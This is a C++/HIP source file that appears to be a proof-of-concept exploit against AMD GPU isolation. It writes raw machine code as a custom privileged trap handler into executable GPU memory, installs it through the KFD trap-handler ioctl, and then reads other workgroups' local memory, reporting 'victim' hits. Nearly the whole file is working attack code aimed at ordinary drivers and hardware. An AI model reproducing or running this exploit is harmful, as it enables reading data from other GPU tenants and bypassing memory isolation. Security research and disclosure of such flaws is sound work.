#define _GNU_SOURCE
#include <hip/hip_runtime.h>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <cstdint>
#include <cerrno>
#include <unistd.h>
#include <fcntl.h>
#include <dirent.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
extern "C" {
#include <linux/kfd_ioctl.h>
}
#define GPU_ID 46235
static int kfd=-1,drm=-1;
static const uint32_t HANDLER[] = { 0xbef00080,0xb9703806,0xbefe0081,0xbeff0080,0x7e000280,0xd86c0000,0x01000000,0xbf8cc07f,0xd289006e,0x00010101,0xc0431bbd,0x00000000,0xd86c0800,0x01000000,0xbf8cc07f,0xd289006e,0x00010101,0xc0431bbd,0x00000004,0xd86c1000,0x01000000,0xbf8cc07f,0xd289006e,0x00010101,0xc0431bbd,0x00000008,0xd86c1800,0x01000000,0xbf8cc07f,0xd289006e,0x00010101,0xc0431bbd,0x0000000c,0xd86c2000,0x01000000,0xbf8cc07f,0xd289006e,0x00010101,0xc0431bbd,0x00000010,0xd86c2800,0x01000000,0xbf8cc07f,0xd289006e,0x00010101,0xc0431bbd,0x00000014,0xd86c3000,0x01000000,0xbf8cc07f,0xd289006e,0x00010101,0xc0431bbd,0x00000018,0xd86c3800,0x01000000,0xbf8cc07f,0xd289006e,0x00010101,0xc0431bbd,0x0000001c,0xd86c4000,0x01000000,0xbf8cc07f,0xd289006e,0x00010101,0xc0431bbd,0x00000020,0xd86c4800,0x01000000,0xbf8cc07f,0xd289006e,0x00010101,0xc0431bbd,0x00000024,0xd86c5000,0x01000000,0xbf8cc07f,0xd289006e,0x00010101,0xc0431bbd,0x00000028,0xd86c5800,0x01000000,0xbf8cc07f,0xd289006e,0x00010101,0xc0431bbd,0x0000002c,0xd86c6000,0x01000000,0xbf8cc07f,0xd289006e,0x00010101,0xc0431bbd,0x00000030,0xd86c6800,0x01000000,0xbf8cc07f,0xd289006e,0x00010101,0xc0431bbd,0x00000034,0xd86c7000,0x01000000,0xbf8cc07f,0xd289006e,0x00010101,0xc0431bbd,0x00000038,0xd86c7800,0x01000000,0xbf8cc07f,0xd289006e,0x00010101,0xc0431bbd,0x0000003c,0xd86c8000,0x01000000,0xbf8cc07f,0xd289006e,0x00010101,0xc0431bbd,0x00000040,0xd86c8800,0x01000000,0xbf8cc07f,0xd289006e,0x00010101,0xc0431bbd,0x00000044,0xd86c9000,0x01000000,0xbf8cc07f,0xd289006e,0x00010101,0xc0431bbd,0x00000048,0xd86c9800,0x01000000,0xbf8cc07f,0xd289006e,0x00010101,0xc0431bbd,0x0000004c,0xd86ca000,0x01000000,0xbf8cc07f,0xd289006e,0x00010101,0xc0431bbd,0x00000050,0xd86ca800,0x01000000,0xbf8cc07f,0xd289006e,0x00010101,0xc0431bbd,0x00000054,0xd86cb000,0x01000000,0xbf8cc07f,0xd289006e,0x00010101,0xc0431bbd,0x00000058,0xd86cb800,0x01000000,0xbf8cc07f,0xd289006e,0x00010101,0xc0431bbd,0x0000005c,0xbeee00ff,0x600dc0de,0xc0431bbd,0x00000060,0xc0840000,0x00000000,0xbf8cc07f,0x806c846c,0x826d806d,0x866dff6d,0x0000ffff,0x8f718378,0xb971e0c2,0xbf800002,0xb9780002,0xbe801f6c };
static int find_fd(const char*w){DIR*d=opendir("/proc/self/fd");struct dirent*e;char b[256],l[256];int r=-1;
 while((e=readdir(d))){snprintf(b,sizeof b,"/proc/self/fd/%s",e->d_name);ssize_t n=readlink(b,l,sizeof l-1);
 if(n<=0)continue;l[n]=0;if(!strcmp(l,w)){r=atoi(e->d_name);break;}}closedir(d);return r;}
static int alloc_mem(uint64_t va,uint64_t sz,uint32_t fl,uint64_t*h,uint64_t*mo){
 struct kfd_ioctl_alloc_memory_of_gpu_args a;memset(&a,0,sizeof a);a.va_addr=va;a.size=sz;a.gpu_id=GPU_ID;a.flags=fl;
 int r=ioctl(kfd,AMDKFD_IOC_ALLOC_MEMORY_OF_GPU,&a);if(!r){if(h)*h=a.handle;if(mo)*mo=a.mmap_offset;}return r;}
static int map_mem(uint64_t h){uint32_t d=GPU_ID;struct kfd_ioctl_map_memory_to_gpu_args m;memset(&m,0,sizeof m);
 m.handle=h;m.device_ids_array_ptr=(uintptr_t)&d;m.n_devices=1;return ioctl(kfd,AMDKFD_IOC_MAP_MEMORY_TO_GPU,&m)==0?(int)m.n_success:-1;}
// WG0 = attacker; WG1..N = victims filling their LDS with 0x5EC0.., packing the CU
__global__ void k(volatile unsigned *sync){
  __shared__ unsigned lds[512];
  int wg=blockIdx.x,t=threadIdx.x;
  if(wg!=0){ for(int i=t;i<512;i+=blockDim.x) lds[i]=0x5EC00000u|(wg<<20)|i; __syncthreads();
    if(t==0) atomicAdd((unsigned*)&sync[0],1u); while(sync[1]==0){} if(t==0) sync[6]=lds[1]; }
  else { for(int i=t;i<512;i+=blockDim.x) lds[i]=0xA11A0000u|i; __syncthreads();
    while(sync[0]<1){} while(sync[4]==0){} if(t==0){ asm volatile("s_trap 1"); sync[3]=0xA5; } }
}
int main(){
  setvbuf(stdout,NULL,_IONBF,0);
  int*warm;hipMalloc(&warm,4096);
  kfd=find_fd("/dev/kfd");drm=find_fd("/dev/dri/renderD128");
  volatile unsigned*sync,*res;hipHostMalloc((void**)&sync,64,hipHostMallocCoherent);
  hipHostMalloc((void**)&res,256,hipHostMallocCoherent);
  for(int i=0;i<16;i++)sync[i]=0; for(int i=0;i<64;i++)res[i]=0;
  void*res_dev=0;hipHostGetDevicePointer(&res_dev,(void*)res,0);
  const uint64_t HVA=0x420000000000ULL;uint64_t hh,hoff;
  if(alloc_mem(HVA,4096,KFD_IOC_ALLOC_MEM_FLAGS_VRAM|KFD_IOC_ALLOC_MEM_FLAGS_PUBLIC|
     KFD_IOC_ALLOC_MEM_FLAGS_EXECUTABLE|KFD_IOC_ALLOC_MEM_FLAGS_WRITABLE|KFD_IOC_ALLOC_MEM_FLAGS_NO_SUBSTITUTE,&hh,&hoff)){printf("halloc %s\n",strerror(errno));return 1;}
  volatile uint32_t*hc=(volatile uint32_t*)mmap(NULL,4096,PROT_READ|PROT_WRITE,MAP_SHARED,drm,(off_t)hoff);
  for(unsigned i=0;i<sizeof(HANDLER)/4;i++)hc[i]=HANDLER[i];(void)hc[0];
  if(map_mem(hh)<=0){printf("hmap %s\n",strerror(errno));return 1;}
  struct kfd_ioctl_set_trap_handler_args t;memset(&t,0,sizeof t);t.gpu_id=GPU_ID;t.tba_addr=HVA;t.tma_addr=(uint64_t)res_dev;
  hipStream_t st;uint32_t cumask[8]={1,0,0,0,0,0,0,0};
  if(hipExtStreamCreateWithCUMask(&st,8,cumask)!=hipSuccess){st=0;}
  int NWG=8;
  hipLaunchKernelGGL(k,dim3(NWG),dim3(64),0,st,sync);
  for(int i=0;i<200000 && sync[0]<1;i++)usleep(100);
  printf("victims running=%u/%d\n",sync[0],NWG-1);
  for(int i=0;i<20;i++)ioctl(kfd,AMDKFD_IOC_SET_TRAP_HANDLER,&t);
  sync[4]=1;
  int ran=0;for(int i=0;i<5000;i++){if(res[24]==0x600dc0de){ran=1;break;}usleep(1000);}
  printf("handler ran=%s\n",ran?"yes":"NO");
  int victimHits=0,ownHits=0;
  for(int i=0;i<24;i++){unsigned v=res[i],h=v&0xFFF00000u;
    const char*c=(v&0xFFFF0000u)==0xA11A0000u?"own":((h==0x5EC00000u)?"VICTIM":( v?"?":"-"));
    if((v&0xFFFF0000u)!=0xA11A0000u && h==0x5EC00000u) victimHits++;
    if((v&0xFFFF0000u)==0xA11A0000u) ownHits++;
    printf("  LDS@0x%04x = 0x%08x %s\n", i*0x800, v, c);
  }
  if(victimHits) printf("\n*** CROSS-WORKGROUP LDS READ CONFIRMED: attacker read a VICTIM WG's LDS at PRIV=1 (%d offsets) ***\n",victimHits);
  else if(ran)   printf("\n(handler ran at PRIV; saw own=%d, no victim pattern -> victim not co-resident on this CU this run)\n",ownHits);
  sync[1]=1;
  return 0;
}
